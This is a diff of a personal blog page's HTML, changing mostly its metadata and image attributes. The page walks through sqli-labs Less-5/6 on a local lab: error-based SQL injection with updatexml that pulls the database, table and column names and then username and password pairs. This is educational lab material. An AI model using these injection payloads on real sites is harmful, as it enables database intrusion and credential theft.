@@ -5,8 +5,17 @@
     <meta charset="utf-8" />
     <title>less5-6 | blackceng的小窝</title>
     <meta name="author" content="blackceng" />
-    <meta name="description" content="我们要做的，就是追上那该死的火车，CJ！" />
-    <meta name="keywords" content="" />
+    <meta name="description" content="less5-6的解题过程和理解" />
+    <meta name="keywords" content="sql_lab,SQL注入, CTF, 网络安全, 渗透测试, blackceng" />
+    <link rel="canonical" href="https://blackceng855.github.io/2025/12/24/less5-7/" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="less5-6 | blackceng的小窝" />
+    <meta property="og:description" content="less5-6的解题过程和理解" />
+    <meta property="og:url" content="https://blackceng855.github.io/2025/12/24/less5-7/" />
+    <meta property="og:site_name" content="blackceng的小窝" />
+    <meta property="og:locale" content="zh_CN" />
+    <meta property="og:image" content="https://blackceng855.github.io/images/avatar.jpg" />
+    <meta name="twitter:card" content="summary" />
     <meta
         name="viewport"
         content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
@@ -22,8 +31,6 @@
     href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
 />
 <script> const mixins = {}; </script>
-
-<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
 
 
 <script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
@@ -48,7 +55,8 @@
 
 <link rel="stylesheet" href="/css/main.css" />
 
-<meta name="generator" content="Hexo 8.1.1"></head>
+<meta name="generator" content="Hexo 8.1.1"><link rel="alternate" href="/atom.xml" title="blackceng的小窝" type="application/atom+xml">
+</head>
 <body>
     <div id="layout">
         <transition name="fade">
@@ -184,7 +192,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/sql-lab/" style="color: #00a596">
+                <a href="/tags/sql-lab/" style="color: #03a9f4">
                     sql_lab
                 </a>
             </span>
@@ -210,11 +218,11 @@
 <li><p><code>updatexml()</code> 在解析错误的 XPath 时，会返回 <strong>第一个非法字符开始的部分字符串</strong>。</p>
 </li>
 <li><p>当</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">concat(1, (select database()))</span><br></pre></td></tr></table></figure>
-
+<pre><code>concat(1, (select database()))
+</code></pre>
 <p>生成</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;1security&quot;</span><br></pre></td></tr></table></figure>
-
+<pre><code>&quot;1security&quot;
+</code></pre>
 <p>时：</p>
 <ul>
 <li><code>1</code> 是合法的 XPath 数字（不会触发报错）。</li>
@@ -233,7 +241,7 @@
 <p>  <code>http://127.0.0.1/sqli-labs-master/Less-5/?id=1&#39; and 1=1--+</code></p>
 <p>  <code>http://127.0.0.1/sqli-labs-master/Less-5/?id=1&#39; and 1=2--+</code></p>
 <p>  在添加单引号后出现报错且1&#x3D;1时正常回显 1&#x3D;2时不回显。</p>
-<h2 id="2-判断列数"><a href="#2-判断列数" class="headerlink" title="2.判断列数"></a>2.判断列数</h2><h2 id=""><a href="#" class="headerlink" title=""></a><img src="/images/QQ_1766578201518.png"></h2><p><img src="/less5-7/e00e07f3-4c84-413e-a950-ede95d438183.png"></p>
+<h2 id="2-判断列数"><a href="#2-判断列数" class="headerlink" title="2.判断列数"></a>2.判断列数</h2><h2 id=""><a href="#" class="headerlink" title=""></a><img loading="lazy" decoding="async" src="/images/QQ_1766578201518.png"></h2><p><img loading="lazy" decoding="async" src="/less5-7/e00e07f3-4c84-413e-a950-ede95d438183.png"></p>
 <p>得到列数为三行</p>
 <h1 id="联合注入和报错注入的不同"><a href="#联合注入和报错注入的不同" class="headerlink" title="联合注入和报错注入的不同"></a>联合注入和报错注入的不同</h1><ul>
 <li><p>联合查询注入要求 <strong>前一个查询返回空结果</strong> ，才能让后续的 <code>union</code> 查询结果显示出来。如果前一个查询有结果（如 <code>id=1</code> 存在），数据库会优先显示它的结果，而 <code>union</code> 部分的数据会被忽略。</p>
@@ -245,20 +253,20 @@
 <li><h2 id="获取基本信息"><a href="#获取基本信息" class="headerlink" title="获取基本信息"></a>获取基本信息</h2></li>
 <li><p><code>?id=1&#39; and updatexml(1,concat(1,(select database())),3) --+</code></p>
 </li>
-<li><p><img src="/images/QQ_1766578749371.png"></p>
+<li><p><img loading="lazy" decoding="async" src="/images/QQ_1766578749371.png"></p>
 </li>
 </ul>
 <p>得到数据库名security</p>
 <p>接着再获取表名</p>
 <p><code>?id=1&#39; and updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where</code></p>
 <p> table_schema &#x3D; ‘security’)),3) –+&#96;</p>
-<p><img src="/images/QQ_1766579624787.png"></p>
+<p><img loading="lazy" decoding="async" src="/images/QQ_1766579624787.png"></p>
 <p>显然我们需要users里的内容</p>
 <p><code>?id=1&#39; and updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where</code></p>
 <p><code> table_schema=&#39;security&#39; and table_name=&#39;users&#39;)),1)--+</code></p>
-<p><img src="/images/QQ_1766580129880.png"></p>
+<p><img loading="lazy" decoding="async" src="/images/QQ_1766580129880.png"></p>
 <p>得到 username 和 password</p>
-<p><img src="/images/image-20251224204900745.png"></p>
+<p><img loading="lazy" decoding="async" src="/images/image-20251224204900745.png"></p>
 <p><code>?id=1%27%20and%20updatexml(1,concat(1,(select concat(username,&#39;~&#39;,password) from users limit 0,1)),1)--+</code></p>
 <p>得到用户名和密码</p>
 <p>less6也是同理</p>
